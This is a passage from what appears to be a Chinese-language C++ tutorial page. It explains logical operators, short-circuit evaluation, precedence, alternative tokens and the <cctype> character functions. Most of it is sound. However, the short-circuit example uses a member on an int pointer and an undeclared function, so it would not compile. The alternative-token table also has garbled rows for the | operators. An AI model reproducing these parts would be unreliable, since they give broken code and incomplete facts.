操作数2</code></th></tr></thead><tbody><tr><td align="left"><code>true</code></td><td align="left"><code>true</code></td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>true</code></td><td align="left"><code>false</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>true</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>false</code></td><td align="left"><code>false</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><p><code>&amp;&amp;</code> 常用于检查是否<strong>同时</strong>满足多个条件。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">bool</span> has_id;</span><br><span class="line">    <span class="keyword">char</span> id_input;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Do you have an ID? (y/n): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; id_input;</span><br><span class="line">    has_id = (id_input == <span class="string">&#x27;y&#x27;</span> || id_input == <span class="string">&#x27;Y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否满足购买条件 (年龄大于等于 18 并且持有 ID)</span></span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">18</span> &amp;&amp; has_id) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Purchase approved.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Purchase denied.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Underage.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!has_id) &#123; <span class="comment">// 使用了逻辑非 !</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: No ID presented.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-3-用-amp-amp-来设置取值范围"><a href="#6-2-3-用-amp-amp-来设置取值范围" class="headerlink" title="6.2.3 用&amp;&amp;来设置取值范围"></a>6.2.3 用&amp;&amp;来设置取值范围</h3><p>逻辑与运算符 <code>&amp;&amp;</code> 非常适合用来检查一个值是否落在某个特定的<strong>范围</strong>内（即同时满足大于某个值和小于另一个值）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your score: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查分数是否在有效范围 [0, 100] 内</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">0</span> &amp;&amp; score &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score is valid.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 进一步判断等级</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">70</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Grade: D&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span> &amp;&amp; score &lt; <span class="number">80</span>) &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Grade: C&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... 其他等级判断</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score is invalid (out of range 0-100).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查一个字符是否是大写字母</span></span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;Q&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27; is an uppercase letter.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 不能像数学中那样写 <code>0 &lt;= score &lt;= 100</code>。这在 C++ 中会被解释为 <code>(0 &lt;= score) &lt;= 100</code>。<code>(0 &lt;= score)</code> 的结果是 <code>true</code> (1) 或 <code>false</code> (0)，然后这个 0 或 1 再与 100 比较，结果几乎总是 <code>true</code>，无法正确判断范围。必须使用 <code>&amp;&amp;</code> 连接两个独立的比较。</p><h3 id="6-2-4-逻辑NOT运算符："><a href="#6-2-4-逻辑NOT运算符：" class="headerlink" title="6.2.4 逻辑NOT运算符：!"></a>6.2.4 逻辑NOT运算符：!</h3><p>逻辑非运算符 <code>!</code> 是一个<strong>一元</strong>运算符（只需要一个操作数）。它将其操作数的布尔值<strong>取反</strong>：如果操作数为 <code>true</code>，结果为 <code>false</code>；如果操作数为 <code>false</code>，结果为 <code>true</code>。</p><p><strong>真值表:</strong></p><table><thead><tr><th align="left">操作数</th><th align="left"><code>!操作数</code></th></tr></thead><tbody><tr><td align="left"><code>true</code></td><td align="left"><code>false</code></td></tr><tr><td align="left"><code>false</code></td><td align="left"><code>true</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><p><code>!</code> 用于反转一个条件的结果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> is_raining = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> items_in_cart = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不是在下雨</span></span><br><span class="line">    <span class="keyword">if</span> (!is_raining) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s not raining. Good day for a walk!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s raining. Better stay inside.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查购物车是否为空</span></span><br><span class="line">    <span class="comment">// items_in_cart == 0 也可以，但 !items_in_cart 更简洁 (利用 0 转换为 false)</span></span><br><span class="line">    <span class="keyword">if</span> (!items_in_cart) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your shopping cart is empty.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 cin 读取是否失败</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; value)) &#123; <span class="comment">// 如果读取失败 (cin 转换为 false), !cin 为 true</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input or EOF.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-5-逻辑运算符细节"><a href="#6-2-5-逻辑运算符细节" class="headerlink" title="6.2.5 逻辑运算符细节"></a>6.2.5 逻辑运算符细节</h3><ol><li><p><strong>优先级 (Precedence):</strong></p><ul><li><p>  逻辑非 <code>!</code> 具有最高的优先级，高于所有关系运算符和算术运算符。</p></li><li><p>  逻辑与 <code>&amp;&amp;</code> 的优先级高于逻辑或 <code>||</code>。</p></li><li><p>  逻辑运算符的优先级低于关系运算符 (<code>&lt;</code>, <code>==</code>, <code>!=</code> 等)。</p></li><li><p>  赋值运算符 (<code>=</code>) 优先级最低。</p></li><li><p>*常见优先级顺序 (高到低):**</p></li></ul><ol><li> <code>!</code></li><li> 算术运算符 (<code>*</code>, <code>/</code>, <code>%</code>, <code>+</code>, <code>-</code>)</li><li> 关系运算符 (<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>)</li><li> 相等运算符 (<code>==</code>, <code>!=</code>)</li><li> 逻辑与 <code>&amp;&amp;</code></li><li> 逻辑或 <code>||</code></li><li> 赋值运算符 (<code>=</code>, <code>+=</code> 等)</li></ol><p> <strong>建议:</strong> 当不确定优先级或为了提高可读性时，<strong>使用括号 <code>()</code></strong> 来明确指定运算顺序。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((age &gt;= <span class="number">18</span> &amp;&amp; age &lt; <span class="number">65</span>) || is_student) &#123; ... &#125; <span class="comment">// 括号明确了 &amp;&amp; 先于 ||</span></span><br></pre></td></tr></table></figure></li><li><p><strong>短路求值 (Short-Circuit Evaluation):</strong></p><ul><li><p>  <strong><code>&amp;&amp;</code> (逻辑与):</strong> 如果 <code>&amp;&amp;</code> 的<strong>左侧</strong>操作数计算结果为 <code>false</code>，则<strong>右侧</strong>操作数<strong>不会</strong>被计算。因为无论右侧是什么，整个表达式的结果都必然是 <code>false</code>。</p></li><li><p><strong><code>||</code> (逻辑或):</strong> 如果 <code>||</code> 的<strong>左侧</strong>操作数计算结果为 <code>true</code>，则<strong>右侧</strong>操作数<strong>不会</strong>被计算。因为无论右侧是什么，整个表达式的结果都必然是 <code>true</code>。</p><p>短路求值非常重要，因为它：</p></li><li><p>  <strong>提高效率:</strong> 避免了不必要的计算。</p></li><li><p>  <strong>允许安全检查:</strong> 可以在检查指针有效性后才解引用它，或在除数非零时才执行除法。</p></li><li><p>*短路求值示例:**</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> divisor = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全的除法检查 (因为 divisor 为 0，右侧不会执行)</span></span><br><span class="line">    <span class="keyword">if</span> (divisor != <span class="number">0</span> &amp;&amp; value / divisor &gt; <span class="number">1</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result is greater than 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Divisor is zero or result is not greater than 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ptr = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 安全的指针访问 (因为 ptr 为 nullptr，右侧不会执行)</span></span><br><span class="line">    <span class="keyword">if</span> (ptr != <span class="literal">nullptr</span> &amp;&amp; ptr-&gt;some_member == <span class="number">5</span>) &#123; </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer member is 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pointer is null or member is not 5.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// || 的短路 (因为 ++count &gt; 0 为 true，右侧不会执行)</span></span><br><span class="line">    <span class="keyword">if</span> (++count &gt; <span class="number">0</span> || some_expensive_function()) &#123; </span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition met. Count is &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// count 变为 1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">some_expensive_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Expensive function called!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这行不会被打印</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="6-2-6-其他表示方式"><a href="#6-2-6-其他表示方式" class="headerlink" title="6.2.6 其他表示方式"></a>6.2.6 其他表示方式</h3><p>为了兼容某些可能缺少 <code>|</code>, <code>&amp;</code>, <code>!</code> 字符的键盘或字符集，C++ 标准定义了一些替代表示（也称为 “digraphs” 或 “alternative tokens”）。这些是关键字，可以直接使用，无需包含特殊头文件。</p><table><thead><tr><th align="left">逻辑运算符</th><th align="left">替代表示</th></tr></thead><tbody><tr><td align="left"><code>&amp;&amp;</code></td><td align="left"><code>and</code></td></tr><tr><td align="left">`</td><td align="left"></td></tr><tr><td align="left"><code>!</code></td><td align="left"><code>not</code></td></tr><tr><td align="left"><code>&amp;=</code></td><td align="left"><code>and_eq</code></td></tr><tr><td align="left">`</td><td align="left">=`</td></tr><tr><td align="left"><code>^=</code></td><td align="left"><code>xor_eq</code></td></tr><tr><td align="left"><code>~</code></td><td align="left"><code>compl</code></td></tr><tr><td align="left"><code>&amp;</code></td><td align="left"><code>bitand</code></td></tr><tr><td align="left">`</td><td align="left">`</td></tr><tr><td align="left"><code>^</code></td><td align="left"><code>xor</code></td></tr><tr><td align="left"><code>!=</code></td><td align="left"><code>not_eq</code></td></tr></tbody></table><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用替代表示</span></span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">0</span> <span class="keyword">and</span> y &lt; <span class="number">20</span>) &#123; <span class="comment">// 等价于 x &gt; 0 &amp;&amp; y &lt; 20</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (and) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">10</span>) &#123; <span class="comment">// 等价于 x &lt; 0 || y == 10</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (or) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> flag) &#123; <span class="comment">// 等价于 !flag</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (not) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (x <span class="keyword">not_eq</span> y) &#123; <span class="comment">// 等价于 x != y</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Condition (not_eq) is true.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这些替代表示是合法的 C++，但在现代编程实践中，直接使用符号运算符 (<code>&amp;&amp;</code>, <code>||</code>, <code>!</code>) 更为常见和普遍接受。除非有特定的编码标准或环境限制要求使用替代表示，否则通常坚持使用符号运算符。</p><h2 id="6-3-字符函数库cctype"><a href="#6-3-字符函数库cctype" class="headerlink" title="6.3 字符函数库cctype"></a>6.3 字符函数库cctype</h2><p>C++ 继承了 C 语言的一个非常有用的函数库，用于处理字符。这个库的 C++ 头文件是 <code>&lt;cctype&gt;</code>，对应的 C 头文件是 <code>&lt;ctype.h&gt;</code>。它提供了一系列函数，可以方便地检查字符的类别（例如，是否是字母、数字、标点符号、空白等）以及转换字符的大小写。</p><p>这些函数通常接收一个 <code>int</code> 类型的参数（该参数值应能表示为 <code>unsigned char</code> 或等于 <code>EOF</code>），并返回一个 <code>int</code> 值。对于测试函数，返回非零值（通常解释为 <code>true</code>）表示条件满足，返回零值（解释为 <code>false</code>）表示条件不满足。对于转换函数，返回转换后的字符的整数表示。</p><p><strong>包含头文件:</strong></p><p>要使用这些函数，需要包含 <code>&lt;cctype&gt;</code> 头文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>常用的字符测试函数:</strong></p><table><thead><tr><th align="left">函数名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>isalnum(ch)</code></td><td align="left">如果 <code>ch</code> 是字母（<code>isalpha</code>）或数字（<code>isdigit</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isalpha(ch)</code></td><td align="left">如果 <code>ch</code> 是字母（大写或小写），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isblank(ch)</code></td><td align="left">(C++11) 如果 <code>ch</code> 是标准空白字符（通常是空格或水平制表符 <code>\t</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>iscntrl(ch)</code></td><td align="left">如果 <code>ch</code> 是控制字符（例如 <code>\n</code>, <code>\t</code>, ASCII 0-31 和 127），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isdigit(ch)</code></td><td align="left">如果 <code>ch</code> 是十进制数字（’0’ 到 ‘9’），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isgraph(ch)</code></td><td align="left">如果 <code>ch</code> 是除空格外的任何可打印字符，返回 <code>true</code>。</td></tr><tr><td align="left"><code>islower(ch)</code></td><td align="left">如果 <code>ch</code> 是小写字母，返回 <code>true</code>。</td></tr><tr><td align="left"><code>isprint(ch)</code></td><td align="left">如果 <code>ch</code> 是任何可打印字符（包括空格），返回 <code>true</code>。</td></tr><tr><td align="left"><code>ispunct(ch)</code></td><td align="left">如果 <code>ch</code> 是标点符号（<code>isgraph</code> 为 <code>true</code> 但 <code>isalnum</code> 为 <code>false</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isspace(ch)</code></td><td align="left">如果 <code>ch</code> 是标准空白字符（空格、换页 <code>\f</code>、换行 <code>\n</code>、回车 <code>\r</code>、水平制表符 <code>\t</code>、垂直制表符 <code>\v</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isupper(ch)</code></td><td align="left">如果 <code>ch</code> 是大写字母，返回 <code>true</code>。</td></tr><tr><td align="left"><code>isxdigit(ch)</code></td><td align="left">如果 <code>ch</code> 是十六进制数字（’0’-‘9’, ‘a’-‘f’, ‘A’-‘F’），返回 <code>true</code>。</td></tr></tbody></table><p><strong>用法与示例 (测试函数):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Hello World! 123\t&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> alpha_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> digit_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> punct_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> space_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Analyzing text: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> ch : text) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(ch)) &#123;</span><br><span class="line">            alpha_count++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">isupper</span>(ch)) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span 